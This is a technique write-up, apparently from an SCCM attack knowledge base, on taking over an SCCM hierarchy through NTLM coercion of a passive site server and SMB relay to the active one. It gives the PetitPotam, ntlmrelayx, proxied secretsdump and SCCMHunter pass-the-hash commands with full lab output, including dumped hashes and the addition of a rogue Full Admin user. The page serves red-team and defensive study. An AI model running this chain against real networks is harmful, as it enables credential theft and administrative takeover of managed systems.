# TAKEOVER-5

## Description
Hierarchy Takeover via NTLM Coercion and SMB Relay From Passive Site Server

## MITRE ATT&CK TTPs
- [T1078.002 - Valid Accounts](https://attack.mitre.org/techniques/T1078/002/)
- [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- [T1003.004 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/004/) 

## Requirements

Valid domain credentials with network connectivity to the passive primary site server and active primary site server.

## Summary

For high availability configurations the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover.

During setup, the passive site server is [required](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#configurations-for-the-site-server-in-passive-mode) to be a member of the active site server's local administrator group. In default setups, SMB signing is not enforced on either site server host operating system and are vulnerable to NTLM relay attacks. 

## Impact

This technique may allow an attacker to relay a passive site server machine account to the primary site server host and compromise and primary site server machine account. With control of this account, an attacker could perform a pass-the-hash (PtH) attack to authenticate to the administration service hosted on the site server operating system and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables lateral movement to all SCCM clients and/or sensitive systems.

## Defensive IDs

## Examples

- Use SCCMHunter to profile SCCM site system server roles
- Use PetitPotam to coerce authentication from passive site server
- Use NTLMRelayx to relay credentials to SMB service on active site server
- Proxy secretsdump to recover active site server credentials
- Use SCCMHunter to PtH and add an arbitrary admin user

### SCCMHunter

The results of the `find` module indicate:
- The *SCCM.INTERNAL.LAB* and *PASSIVE.INTERNAL.LAB* sytems are both site servers in the "LAB" site
- The *SCCM.INTERNAL.LAB* host is the active site server and the *PASSIVE.INTERNAL.LAB* host is the passive site server
- SMB signing is disabled on both systems


```
[04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
[04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
                       +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
                       | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+ 
```

### PetitPotam

 - Valid domain credentials are used to coerce authentication from the *PASSIVE.INTERNAL.LAB* passive site server to the attacker host

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```


### NTLMRelayx
- Authentication from the *PASSIVE.INTERNAL.LAB* site server is caught and relayed from the attacker host to the *SCCM.INTERNAL.LAB* active site server. The `-socks` flag is used to hold the authenticated session open

```
┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/impacket/examples]
└─# python3 ntlmrelayx.py -t 10.10.100.121 -smb2support -socks
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121
[*] Authenticating against smb://10.10.100.121 as LAB/PASSIVE$ SUCCEED
[*] SOCKS: Adding LAB/PASSIVE$@10.10.100.121(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
[*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)
```

### Secretsdump
 - Secretsdump is proxied through the existing authenticated session to recover the *SCCM.INTERNAL.LAB* site server's hashed credential

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─#  proxychains secretsdump.py lab/passive\$@sccm.internal.lab                     
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.121:445  ...  OK
[*] Target system bootKey: 0x436a3e67c2c89ded60aeb1f1819428c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:003d349493bc6acfb242ae5c2ff3d819:::
[*] Dumping cached domain logon information (domain/username:hash)
INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
lab\SCCM$:aes256-cts-hmac-sha1-96:76bf72e59677dfe072fd6609ccdc1343d318f7cc557b25588b36046747f80172
lab\SCCM$:aes128-cts-hmac-sha1-96:b2d7f1a79de08211ae6a518c82a715f4
lab\SCCM$:des-cbc-md5:5de98a07aefb983e

```

### SCCMHunter

- The recovered active site server machine account hash is used to authenticate to the Administration Service API and add an arbitrary user as Full Admin

```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 v0.0.2                   
                                                                 @garrfoster                    
    
    
    
[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
() C:\ >> show_admins 
[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
() (C:\) >> get_user specter
[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
[06:53:13 PM] INFO     [+] User found.                                                                                                                       
[06:53:14 PM] INFO     ------------------------------------------                                                                                            
                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
                       FullDomainName: INTERNAL.LAB                                                                                                          
                       FullUserName: specter                                                                                                              
                       Mail:                                                                                                                                 
                       NetworkOperatingSystem: Windows NT                                                                                                    
                       ResourceId: 2063597574                                                                                                                
                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
                       UniqueUserName: lab\specter                                                                                                           
                       UserAccountControl: 66048                                                                                                             
                       UserName: specter                                                                                                           
                       UserPrincipalName: specter@internal.lab                                                                                        
                       ------------------------------------------                                                                                            
() (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
() (C:\) >> show_admins 
[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
[08:46:39 PM] INFO     specter 


```


## References
Author, Title, URL